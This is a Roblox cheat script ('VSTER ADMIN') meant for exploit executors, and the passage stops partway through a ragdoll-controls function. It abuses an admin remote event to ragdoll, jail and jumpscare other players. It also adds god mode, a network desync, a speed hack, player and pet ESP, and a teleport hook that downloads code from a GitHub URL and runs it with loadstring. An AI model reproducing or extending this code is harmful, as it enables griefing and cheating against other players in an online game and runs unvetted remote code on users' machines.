local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local PhysicsService = game:GetService("PhysicsService")
local TweenService = game:GetService("TweenService")

local Remote = ReplicatedStorage
    :WaitForChild("Packages")
    :WaitForChild("Net")
    :WaitForChild("RE/AdminPanelService/ExecuteCommand")

local commands = {
    "ragdoll",
    "rocket",
    "balloon",
    "inverse",
    "nightvision",
    "jail",
    "tiny",
    "jumpscare",
    "morph"
}

local ADMIN_RAW_URL = "https://raw.githubusercontent.com/thetoaster97/99123/refs/heads/main/4.lua"

local function find_queue()
    if type(queue_on_teleport) == "function" then return queue_on_teleport end
    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
    if secure_load and type(secure_load.queue_on_teleport) == "function" then return secure_load.queue_on_teleport end
    if KRNL and type(KRNL.queue_on_teleport) == "function" then return KRNL.queue_on_teleport end
    for k,v in pairs(_G) do
        if type(v) == "function" and tostring(k):lower():find("queue_on_teleport") then
            return v
        end
    end
    return nil
end

local queue_func = find_queue()

if queue_func and ADMIN_RAW_URL and ADMIN_RAW_URL ~= "" then
    local queued_payload = [[
local url = "]] .. ADMIN_RAW_URL .. [["
local function safeGet(u)
    if syn and type(syn.request) == "function" then
        local ok, res = pcall(function() return syn.request({Url = u, Method = "GET"}).Body end)
        if ok and res then return res end
    end
    if type(http_request) == "function" then
        local ok, res = pcall(function() return http_request({Url = u}).Body end)
        if ok and res then return res end
    end
    if type(request) == "function" then
        local ok, res = pcall(function() return request({Url = u}).Body end)
        if ok and res then return res end
    end
    if type(game.HttpGet) == "function" then
        local ok, res = pcall(function() return game:HttpGet(u) end)
        if ok and res then return res end
    end
    local HttpService = game:GetService("HttpService")
    local ok, res = pcall(function() return HttpService:GetAsync(u) end)
    if ok and res then return res end
    return nil
end

local code = safeGet(url)
if code then
    local fn = loadstring(code)
    if fn then pcall(fn) end
end
]]

    TeleportService.TeleportInitFailed:Connect(function()
        local ok, err = pcall(function() queue_func(queued_payload) end)
        if ok then
            print("[VSTER] Admin script queued for server hop.")
        else
            warn("[VSTER] Failed to queue payload:", err)
        end
    end)
    
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.OnTeleport:Connect(function(State)
        if State == Enum.TeleportState.Started then
            local ok, err = pcall(function() queue_func(queued_payload) end)
            if ok then
                print("[VSTER] Admin script queued for server hop.")
            else
                warn("[VSTER] Failed to queue payload:", err)
            end
        end
    end)
end

-- Main GUI Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PlayerEffectPanel"
ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 280, 0, 375)
Frame.Position = UDim2.new(1, -290, 0.5, -187.5)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BackgroundTransparency = 0.1
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "VSTER ADMIN"
Title.TextColor3 = Color3.fromRGB(235, 225, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.Parent = Frame

local Scrolling = Instance.new("ScrollingFrame")
Scrolling.Size = UDim2.new(1, 0, 1, -50)
Scrolling.Position = UDim2.new(0, 0, 0, 45)
Scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
Scrolling.ScrollBarThickness = 6
Scrolling.BackgroundTransparency = 1
Scrolling.Parent = Frame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 6)
UIListLayout.Parent = Scrolling

local function createPlayerButton(player)
    local PlayerFrame = Instance.new("Frame")
    PlayerFrame.Size = UDim2.new(1, -10, 0, 35)
    PlayerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    PlayerFrame.BorderSizePixel = 0
    PlayerFrame.Parent = Scrolling

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Text = player.Name
    NameLabel.Size = UDim2.new(0.6, 0, 1, 0)
    NameLabel.Position = UDim2.new(0.05, 0, 0, 0)
    NameLabel.BackgroundTransparency = 1
    NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    NameLabel.Font = Enum.Font.Gotham
    NameLabel.TextSize = 18
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.Parent = PlayerFrame

    local Button = Instance.new("TextButton")
    Button.Text = "Fuck them up"
    Button.Size = UDim2.new(0.4, 0, 0.8, 0)
    Button.Position = UDim2.new(0.55, 0, 0.1, 0)
    Button.BackgroundColor3 = Color3.fromRGB(60, 130, 255)
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 16
    Button.AutoButtonColor = true
    Button.Parent = PlayerFrame

    Button.MouseButton1Click:Connect(function()
        for _, command in ipairs(commands) do
            local args = {
                player,
                command
            }
            Remote:FireServer(unpack(args))
            task.wait(0.15)
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= Players.LocalPlayer then
        createPlayerButton(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    createPlayerButton(player)
end)

Players.PlayerRemoving:Connect(function(player)
    for _, child in ipairs(Scrolling:GetChildren()) do
        if child:IsA("Frame") then
            local label = child:FindFirstChildOfClass("TextLabel")
            if label and label.Text == player.Name then
                child:Destroy()
            end
        end
    end
end)

-- Character Setup
local player = Players.LocalPlayer
local character = player.Character

if character then
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        
        humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            humanoid.Health = math.huge
        end)
    end
end

-- Desync Variables
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")

local DESYNC_ENABLED = false
local FAKE_POSITION = nil
local UPDATE_INTERVAL = 0.5 
local lastUpdate = tick()
local OFFSET_RANGE = 4 
local DEBOUNCE = false

local serverPosBox = nil

local function createServerPosBox()
    if serverPosBox then
        serverPosBox:Destroy()
    end
    
    serverPosBox = Instance.new("Part")
    serverPosBox.Name = "ServerPositionBox"
    serverPosBox.Size = Vector3.new(4, 5, 3)
    serverPosBox.Transparency = 0.7
    serverPosBox.Color = Color3.fromRGB(255, 0, 0)
    serverPosBox.Material = Enum.Material.Neon
    serverPosBox.CanCollide = false
    serverPosBox.Anchored = true
    serverPosBox.Parent = workspace
    
    local selectionBox = Instance.new("SelectionBox")
    selectionBox.Adornee = serverPosBox
    selectionBox.LineThickness = 0.05
    selectionBox.Color3 = Color3.fromRGB(255, 255, 0)
    selectionBox.Parent = serverPosBox
    
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Size = UDim2.new(0, 200, 0, 50)
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
    billboardGui.AlwaysOnTop = true
    billboardGui.Parent = serverPosBox
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "WHERE OTHERS SEE YOU"
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeTransparency = 0
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    textLabel.Parent = billboardGui
end

local function updateServerPosBox()
    if DESYNC_ENABLED and HumanoidRootPart and FAKE_POSITION then
        if not serverPosBox then
            createServerPosBox()
        end
        
        serverPosBox.CFrame = FAKE_POSITION
        serverPosBox.Transparency = 0.5
    else
        if serverPosBox then
            serverPosBox.Transparency = 1
        end
    end
end

local function createBlurEffect()
    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Name = "FlingBlur"
    blurEffect.Size = 0
    blurEffect.Parent = game:GetService("Lighting")
    return blurEffect
end

local blurEffect = createBlurEffect()

local function toggleSyncEffects(enabled)
    if enabled then
        local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = TweenService:Create(blurEffect, tweenInfo, {Size = 50})
        tween:Play()
    else
        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = TweenService:Create(blurEffect, tweenInfo, {Size = 0})
        tween:Play()
    end
end

local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DesyncGUI"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local startButton = Instance.new("TextButton")
    startButton.Size = UDim2.new(0, 280, 0, 40)
    startButton.Position = UDim2.new(1, -290, 0.5, 200)
    startButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    startButton.Text = "START"
    startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    startButton.TextSize = 18
    startButton.Font = Enum.Font.GothamBold
    startButton.BorderSizePixel = 0
    startButton.Parent = screenGui
    
    local startCorner = Instance.new("UICorner")
    startCorner.CornerRadius = UDim.new(0, 8)
    startCorner.Parent = startButton
    
    screenGui.Parent = game:GetService("CoreGui")
    return screenGui, startButton
end

local gui, startBtn = createGUI()

print("hello " .. LocalPlayer.DisplayName .. " if ur anti hit aint working anymore press the desync button or press f again ty")
print("TUTORIAL: just press the button then it should work IF IT DOSENT HERES AN TUTORIAL FOR PC NOT MOBILE IT SHOULD WORK IF U PRESS THE BUTTON IM SURE. PRESS F 2x if u dont wanna press the button then it should work too")

pcall(function()
    PhysicsService:RegisterCollisionGroup("NoCollide")
    PhysicsService:CollisionGroupSetCollidable("NoCollide", "Default", false)
end)

local function applyFFlags(enable)
    pcall(function()
        if enable then
            setfflag("WorldStepMax", "-1000000")
            setfflag("DFIntS2PhysicsSenderRate", "1")
            setfflag("DFIntAssemblyExtentsExpansionStudHundredth", "1000")
            setfflag("FFlagRakNetForceUseUnreliable", "True")
            setfflag("FFlagDebugDisableTelemetryV2Event", "True")
            setfflag("DFIntNetworkLatencyTolerance", "9999")
            setfflag("DFIntTaskSchedulerTargetFps", "1")
            setfflag("DFIntNetworkPhysicsSenderRate", "1")
            setfflag("DFIntNetworkPhysicsRate", "1")
            setfflag("DFIntCharacterCollisionUpdateRate", "1")
            setfflag("DFIntCharacterControllerUpdateRate", "1")
        else
            setfflag("WorldStepMax", "0")
            setfflag("DFIntS2PhysicsSenderRate", "60")
            setfflag("DFIntAssemblyExtentsExpansionStudHundredth", "0")
            setfflag("DFIntNetworkLatencyTolerance", "100")
            setfflag("DFIntTaskSchedulerTargetFps", "60")
            setfflag("DFIntNetworkPhysicsSenderRate", "60")
            setfflag("DFIntNetworkPhysicsRate", "60")
            setfflag("DFIntCharacterCollisionUpdateRate", "30")
            setfflag("DFIntCharacterControllerUpdateRate", "30")
        end
    end)
end

local function setClientOwnership()
    for _, part in pairs(Character:GetDescendants()) do
        if part:IsA("BasePart") then
            pcall(function()
                part:SetNetworkOwner(LocalPlayer)
                part.Anchored = false
                if DESYNC_ENABLED then
                    part.CollisionGroup = "NoCollide"
                    part.CanCollide = false
                else
                    part.CollisionGroup = "Default"
                    part.CanCollide = true
                end
            end)
        end
    end
    pcall(function()
        sethiddenproperty(LocalPlayer, "SimulationRadius", 99999)
    end)
end

local function initializeDesync()
    if HumanoidRootPart then
        FAKE_POSITION = HumanoidRootPart.CFrame
        setClientOwnership()
        applyFFlags(true)
        createServerPosBox()
    end
end

local function toggleDesync()
    DESYNC_ENABLED = not DESYNC_ENABLED
    if DESYNC_ENABLED then
        initializeDesync()
    else
        applyFFlags(false)
        setClientOwnership()
        if serverPosBox then
            serverPosBox:Destroy()
            serverPosBox = nil
        end
    end
end

local function fireQuantumTeleport()
    if not Character or not HumanoidRootPart then return end
    
    toggleSyncEffects(true)
    
    local Event = ReplicatedStorage.Packages.Net["RE/QuantumCloner/OnTeleport"]
    Event:FireServer()
    
    print("Fired QuantumCloner teleport event!")
    
    wait(0.3)
    
    toggleSyncEffects(false)
end

local function spamF()
    local Event = ReplicatedStorage.Packages.Net["RE/QuantumCloner/OnTeleport"]
    Event:FireServer()
    print("Fired QuantumCloner teleport event FIRST!")
    wait(0.5)
    
    for i = 1, 2 do
        if not DEBOUNCE then
            DEBOUNCE = true
            toggleDesync()
            wait(1)
            DEBOUNCE = false
        end
    end
end

startBtn.MouseButton1Click:Connect(function()
    spamF()
end)

RunService.RenderStepped:Connect(function()
    if not DESYNC_ENABLED or not Character or not HumanoidRootPart then return end
    Humanoid:ChangeState(Enum.HumanoidStateType.Running)
    Humanoid.PlatformStand = false
    for _, part in pairs(Character:GetChildren()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            part.CFrame = HumanoidRootPart.CFrame * CFrame.new(
                math.random(-OFFSET_RANGE, OFFSET_RANGE),
                math.random(-0.5, 0.5),
                math.random(-OFFSET_RANGE, OFFSET_RANGE)
            )
        end
    end
    
    updateServerPosBox()
end)

RunService.Heartbeat:Connect(function()
    if not DESYNC_ENABLED or not Character or not HumanoidRootPart or not FAKE_POSITION then return end
    if tick() - lastUpdate >= UPDATE_INTERVAL then
        pcall(function()
            local moveOffset = Humanoid.MoveDirection * 0.2
            local randomOffset = Vector3.new(
                math.random(-OFFSET_RANGE/2, OFFSET_RANGE/2),
                0,
                math.random(-OFFSET_RANGE/2, OFFSET_RANGE/2)
            )
            FAKE_POSITION = FAKE_POSITION * CFrame.new(moveOffset + randomOffset)
            HumanoidRootPart.CFrame = FAKE_POSITION
        end)
        lastUpdate = tick()
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or input.KeyCode ~= Enum.KeyCode.F then return end
    
    startBtn.MouseButton1Click:Fire()
end)

LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    HumanoidRootPart = newChar:WaitForChild("HumanoidRootPart")
    Humanoid = newChar:WaitForChild("Humanoid")
    
    if Humanoid then
        Humanoid.MaxHealth = math.huge
        Humanoid.Health = math.huge
        
        Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            Humanoid.Health = math.huge
        end)
    end
    
    if DESYNC_ENABLED then
        wait(1)
        initializeDesync()
    end
end)

game:GetService("Lighting").ChildRemoved:Connect(function(child)
    if child.Name == "FlingBlur" then
        blurEffect = createBlurEffect()
    end
end)

game:GetService("CoreGui").ChildRemoved:Connect(function(child)
    if child.Name == "DesyncGUI" then
        gui, startBtn = createGUI()
        startBtn.MouseButton1Click:Connect(function()
            spamF()
        end)
    end
end)

-- Grapple Hook Speed Boost
local FIRE_INTERVAL = 0.1
local SPEED_MULTIPLIER = 3.8
local GRAPPLE_TOOL_NAME = "Grapple Hook"

local GrappleEvent = ReplicatedStorage.Packages.Net["RE/UseItem"]

local movementConnection = nil
local fireConnection = nil
local isHoldingGrapple = false

local function checkForGrappleHook()
    if character then
        local tool = character:FindFirstChild(GRAPPLE_TOOL_NAME)
        if tool and tool:IsA("Tool") then
            return true
        end
    end
    return false
end

local function applyDirectVelocity()
    if character and character:FindFirstChild("HumanoidRootPart") and isHoldingGrapple then
        local rootPart = character.HumanoidRootPart
        local moveVector = Humanoid.MoveDirection
        
        if moveVector.Magnitude > 0 then
            local currentVelocity = rootPart.AssemblyLinearVelocity
            local targetVelocity = Vector3.new(
                moveVector.X * Humanoid.WalkSpeed * SPEED_MULTIPLIER,
                currentVelocity.Y,
                moveVector.Z * Humanoid.WalkSpeed * SPEED_MULTIPLIER
            )
            rootPart.AssemblyLinearVelocity = targetVelocity
        end
    end
end

local function fireGrappleHook()
    if isHoldingGrapple then
        pcall(function()
            GrappleEvent:FireServer(0.70743885040283)
        end)
    end
end

local function startFireLoop()
    if fireConnection then
        fireConnection:Disconnect()
    end
    
    fireConnection = spawn(function()
        while character and character.Parent do
            fireGrappleHook()
            wait(FIRE_INTERVAL)
        end
    end)
end

local function startMovementLoop()
    if movementConnection then
        movementConnection:Disconnect()
    end
    
    movementConnection = RunService.Heartbeat:Connect(function()
        isHoldingGrapple = checkForGrappleHook()
        applyDirectVelocity()
    end)
end

local function initializeGrapple()
    startFireLoop()
    startMovementLoop()
    print("Grapple-conditional speed script active!")
    print("Hold the '" .. GRAPPLE_TOOL_NAME .. "' tool to activate speed boost!")
end

local function onCharacterAddedGrapple(newCharacter)
    character = newCharacter
    Humanoid = character:WaitForChild("Humanoid")
    HumanoidRootPart = character:WaitForChild("HumanoidRootPart")
    isHoldingGrapple = false
    
    if movementConnection then
        movementConnection:Disconnect()
        movementConnection = nil
    end
    if fireConnection then
        fireConnection:Disconnect()
        fireConnection = nil
    end
    
    wait(1)
    initializeGrapple()
end

LocalPlayer.CharacterAdded:Connect(onCharacterAddedGrapple)

if character and character.Parent then
    initializeGrapple()
end

-- Timer ESP Feature
local overlayFolder = Instance.new("Folder")
overlayFolder.Name = "TimerOverlays"
overlayFolder.Parent = player:WaitForChild("PlayerGui")

local function makeBillboard(target, sourceLabel)
    local billboard = Instance.new("BillboardGui")
    billboard.Size = UDim2.new(0, 200, 0, 60)
    billboard.StudsOffset = Vector3.new(0, 5, 0)
    billboard.AlwaysOnTop = true
    billboard.MaxDistance = 1e6
    billboard.Name = "TimerESP"
    billboard.Parent = overlayFolder
    billboard.Adornee = target
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
    textLabel.TextStrokeTransparency = 0
    textLabel.TextScaled = true
    textLabel.Parent = billboard
    
    RunService.RenderStepped:Connect(function()
        if sourceLabel.Parent and target then
            local text = sourceLabel.Text
            if text == "0s" or text == "0" then
                textLabel.Text = "Unlocked"
                textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
            else
                textLabel.Text = text
                textLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
            end
        else
            billboard.Enabled = false
        end
    end)
end

local function isExcluded(text)
    text = string.lower(text or "")
    return text:find("free") or text:find("sentry") or text:find("!") or text:find("m") or text:find("J3sus777")
end

local function scanTimers()
    for _, descendant in ipairs(workspace:GetDescendants()) do
        if descendant:IsA("TextLabel") and descendant.Text:match("%ds") and not isExcluded(descendant.Text) then
            local adornee = descendant:FindFirstAncestorWhichIsA("BasePart")
            if adornee and adornee.Position.Y <= 7 then
                makeBillboard(adornee, descendant)
            end
        end
    end
end

scanTimers()

workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("TextLabel") and obj.Text:match("%ds") and not isExcluded(obj.Text) then
        local adornee = obj:FindFirstAncestorWhichIsA("BasePart")
        if adornee and adornee.Position.Y <= 7 then
            makeBillboard(adornee, obj)
        end
    end
end)

-- Player ESP Feature
local visuals = {}
local BOX_COLOR = Color3.fromRGB(0, 200, 200)
local NAME_COLOR = Color3.fromRGB(100, 200, 255)
local BOX_TRANSPARENCY = 0.2

local function addVisuals(target)
    if visuals[target] then return end
    if target == player then return end
    
    local function setup(char)
        if not char then return end
        if visuals[target] then
            for _, obj in ipairs(visuals[target]) do
                if obj and obj.Parent then obj:Destroy() end
            end
        end
        
        local added = {}
        
        local box = Instance.new("SelectionBox")
        box.Name = "PlayerBox"
        box.Adornee = char
        box.LineThickness = 0.08
        box.Color3 = BOX_COLOR
        box.SurfaceTransparency = BOX_TRANSPARENCY
        box.Transparency = BOX_TRANSPARENCY
        box.Parent = char
        table.insert(added, box)
        
        local head = char:FindFirstChild("Head")
        if head then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "PlayerNameTag"
            billboard.Adornee = head
            billboard.Size = UDim2.new(0, 150, 0, 30)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = char
            
            local nameLabel = Instance.new("TextLabel")
            nameLabel.Size = UDim2.new(1, 0, 1, 0)
            nameLabel.BackgroundTransparency = 1
            nameLabel.Text = target.DisplayName or target.Name
            nameLabel.TextColor3 = NAME_COLOR
            nameLabel.Font = Enum.Font.SourceSansBold
            nameLabel.TextSize = 18
            nameLabel.TextStrokeTransparency = 0.3
            nameLabel.Parent = billboard
            
            table.insert(added, billboard)
        end
        
        visuals[target] = added
    end
    
    setup(target.Character)
    target.CharacterAdded:Connect(setup)
end

local function removeVisuals(target)
    if visuals[target] then
        for _, obj in ipairs(visuals[target]) do
            if obj and obj.Parent then obj:Destroy() end
        end
        visuals[target] = nil
    end
end

for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= player then addVisuals(plr) end
end

Players.PlayerAdded:Connect(addVisuals)
Players.PlayerRemoving:Connect(removeVisuals)

-- Super Jump Feature
local humanoid, rootPart

local function updateCharacter()
    local char = player.Character or player.CharacterAdded:Wait()
    humanoid = char:WaitForChild("Humanoid")
    rootPart = char:WaitForChild("HumanoidRootPart")
    
    humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
        if humanoid.Jump and rootPart then
            rootPart.Velocity = Vector3.new(rootPart.Velocity.X, 50, rootPart.Velocity.Z)
        end
    end)
end

-- === PET TRACKER ADDON (Paste at end of admin script) ===

-- Pet tracker helpers
local function parseMoney(text)
    text = string.lower(text or "")
    local num = tonumber(text:match("[%d%.]+")) or 0
    if text:find("k") then
        num *= 1e3
    elseif text:find("m") then
        num *= 1e6
    elseif text:find("b") then
        num *= 1e9
    elseif text:find("t") then
        num *= 1e12
    end
    return num
end

local function abbreviate(n)
    local abs = math.abs(n)
    if abs >= 1e12 then return string.format("%.2ft", n/1e12):gsub("%.0+t","t") end
    if abs >= 1e9 then return string.format("%.2fb", n/1e9):gsub("%.0+b","b") end
    if abs >= 1e6 then return string.format("%.2fm", n/1e6):gsub("%.0+m","m") end
    if abs >= 1e3 then return string.format("%.2fk", n/1e3):gsub("%.0+k","k") end
    return tostring(math.floor(n))
end

local function isBlacklisted(obj)
    while obj do
        local name = string.lower(obj.Name or "")
        if name == "generationboard" or name:find("top") then
            return true
        end
        obj = obj.Parent
    end
    return false
end

local function findNameFromBillboard(billboard)
    local bestText, bestLen
    for _, d in ipairs(billboard:GetDescendants()) do
        if d:IsA("TextLabel") then
            local t = d.Text or ""
            if not t:find("/s") and not t:find("%$") then
                if not bestLen or #t > bestLen then
                    bestText, bestLen = t, #t
                end
            end
        end
    end
    return bestText
end

local function getModelForLabel(label)
    local bb = label:FindFirstAncestorWhichIsA("BillboardGui")
    if bb then
        if bb.Adornee and bb.Adornee:IsA("BasePart") then
            local m = bb.Adornee:FindFirstAncestorWhichIsA("Model")
            if m then return m end
        end
        if bb.Parent and bb.Parent:IsA("Model") then
            return bb.Parent
        end
    end
    return label:FindFirstAncestorWhichIsA("Model")
end

local function getAnyPart(model)
    if not model then return nil end
    return model.PrimaryPart
        or model:FindFirstChild("HumanoidRootPart")
        or model:FindFirstChildWhichIsA("BasePart")
end

-- Pet tracker visuals
local petBillboardGui, petTextLabel, petHighlight, petTracerLine = nil, nil, nil, nil
local currentPetModel

local function clearPetVisuals()
    if petBillboardGui then petBillboardGui:Destroy() petBillboardGui = nil end
    if petHighlight then petHighlight:Destroy() petHighlight = nil end
    if petTracerLine then petTracerLine:Destroy() petTracerLine = nil end
    currentPetModel = nil
end

local function create3DLine(startPos, endPos)
    if petTracerLine then
        petTracerLine:Destroy()
    end
    
    local distance = (endPos - startPos).Magnitude
    local midPoint = (startPos + endPos) / 2
    
    petTracerLine = Instance.new("Part")
    petTracerLine.Name = "BestPetTracer"
    petTracerLine.Anchored = true
    petTracerLine.CanCollide = false
    petTracerLine.Material = Enum.Material.Neon
    petTracerLine.Color = Color3.fromRGB(0, 255, 0)
    petTracerLine.Size = Vector3.new(0.2, 0.2, distance)
    petTracerLine.CFrame = CFrame.new(midPoint, endPos)
    petTracerLine.Transparency = 0.3
    petTracerLine.Parent = workspace
    
    local attachment0 = Instance.new("Attachment")
    attachment0.Parent = petTracerLine
    attachment0.Position = Vector3.new(0, 0, -distance/2)
    
    local attachment1 = Instance.new("Attachment")
    attachment1.Parent = petTracerLine
    attachment1.Position = Vector3.new(0, 0, distance/2)
    
    local beam = Instance.new("Beam")
    beam.Attachment0 = attachment0
    beam.Attachment1 = attachment1
    beam.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
    beam.FaceCamera = true
    beam.Width0 = 0.5
    beam.Width1 = 0.5
    beam.Transparency = NumberSequence.new(0.2)
    beam.Parent = petTracerLine
end

local function update3DLine()
    if currentPetModel and player.Character then
        local playerRoot = player.Character:FindFirstChild("HumanoidRootPart")
        local petPart = getAnyPart(currentPetModel)
        
        if playerRoot and petPart then
            create3DLine(playerRoot.Position, petPart.Position)
        end
    end
end

local function updateBestPet()
    local bestLabel, bestValue = nil, -math.huge
    
    local plotsFolder = workspace:FindFirstChild("Plots")
    if not plotsFolder then
        clearPetVisuals()
        return
    end
    
    for _, bb in ipairs(plotsFolder:GetDescendants()) do
        if bb:IsA("BillboardGui") and not isBlacklisted(bb) then
            for _, lbl in ipairs(bb:GetDescendants()) do
                if lbl:IsA("TextLabel") then
                    local text = lbl.Text or ""
                    if text:find("/s") and text:find("%$") then
                        local val = parseMoney(text)
                        if val > bestValue then
                            bestValue = val
                            bestLabel = lbl
                        end
                    end
                end
            end
        end
    end
    
    if not bestLabel then
        clearPetVisuals()
        return
    end
    
    local model = getModelForLabel(bestLabel)
    local part = getAnyPart(model)
    
    if not (model and part) then
        clearPetVisuals()
        return
    end
    
    if currentPetModel == model and petTextLabel then
        petTextLabel.Text = string.format("%s | $%s/s", 
            findNameFromBillboard(bestLabel:FindFirstAncestorWhichIsA("BillboardGui")) or model.Name,
            abbreviate(bestValue))
        update3DLine()
        return
    end
    
    clearPetVisuals()
    currentPetModel = model
    
    petHighlight = Instance.new("Highlight")
    petHighlight.Name = "BestPetHighlight_Client"
    petHighlight.FillColor = Color3.fromRGB(0, 255, 0)
    petHighlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    petHighlight.FillTransparency = 0.5
    petHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    petHighlight.Adornee = model
    petHighlight.Parent = model
    
    petBillboardGui = Instance.new("BillboardGui")
    petBillboardGui.Name = "BestPetBillboard_Client"
    petBillboardGui.Adornee = part
    petBillboardGui.Size = UDim2.new(0, 240, 0, 60)
    petBillboardGui.StudsOffset = Vector3.new(0, 6, 0)
    petBillboardGui.AlwaysOnTop = true
    petBillboardGui.MaxDistance = 1e6
    petBillboardGui.Parent = player:WaitForChild("PlayerGui")
    
    petTextLabel = Instance.new("TextLabel")
    petTextLabel.Size = UDim2.new(1, 0, 1, 0)
    petTextLabel.BackgroundTransparency = 1
    petTextLabel.Font = Enum.Font.SourceSansBold
    petTextLabel.TextScaled = true
    petTextLabel.TextStrokeTransparency = 0
    petTextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    petTextLabel.Parent = petBillboardGui
    petTextLabel.Text = string.format("%s | $%s/s", 
        findNameFromBillboard(bestLabel:FindFirstAncestorWhichIsA("BillboardGui")) or model.Name,
        abbreviate(bestValue))
    
    update3DLine()
end

-- Pet tracker update loops
spawn(function()
    while true do
        updateBestPet()
        task.wait(1)
    end
end)

RunService.Heartbeat:Connect(function()
    if currentPetModel and petTracerLine then
        update3DLine()
    end
end)

player.CharacterAdded:Connect(function()
    task.wait(0.5)
    update3DLine()
end)

local function initRagdollControls()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    local isRagdolled = false
    local moveDirection = Vector2.new(0, 0)
    local platform = nil
    local bodyPos = nil
    local initialHeight = 0
    local moveSpeed = 39
    local motors = {}
    local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "RagdollControls"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local joystickOuter = Instance.new("ImageLabel")
    joystickOuter.Name = "JoystickOuter"
    joystickOuter.Size = UDim2.new(0, 170, 0, 170)
    joystickOuter.Position = UDim2.new(0, 30, 1, -200)
    joystickOuter.BackgroundTransparency = 1
    joystickOuter.Image = "rbxasset://textures/ui/Joystick/Outline.png"
    joystickOuter.ImageTransparency = 0.3
    joystickOuter.Visible = false
    joystickOuter.Parent = screenGui

    local joystickInner = Instance.new("ImageLabel")
    joystickInner.Name = "JoystickInner"
    joystickInner.Size = UDim2.new(0, 70, 0, 70)
    joystickInner.Position = UDim2.new(0.5, -35, 0.5, -35)
    joystickInner.BackgroundTransparency = 1
    joystickInner.Image = "rbxasset://textures/ui/Joystick/Base.png"
    joystickInner.ImageTransparency = 0.2
    joystickInner.Parent = joystickOuter

    local jumpButton = Instance.new("ImageButton")
    jumpButton.Name = "JumpButton"
    jumpButton.Size = UDim2.new(0, 90, 0, 90)
    jumpButton.Position = UDim2.new(1, -120, 1, -120)
    jumpButton.BackgroundTransparency = 1
    jumpButton.Image = "rbxasset://textures/ui/Input/Buttons/jump@2x.png"
    jumpButton.ImageTransparency = 0.2
    jumpButton.Visible = false
    jumpButton.Parent = screenGui

    local dragging = false
    local touchInput = nil

    local function updateJoystick(input)
        local center = joystickOuter.AbsolutePosition + joystickOuter.AbsoluteSize / 2
        local delta = Vector2.new(input.Position.X, input.Position.Y) - center
        local maxRadius = 50
        local distance = math.min(delta.Magnitude, maxRadius)
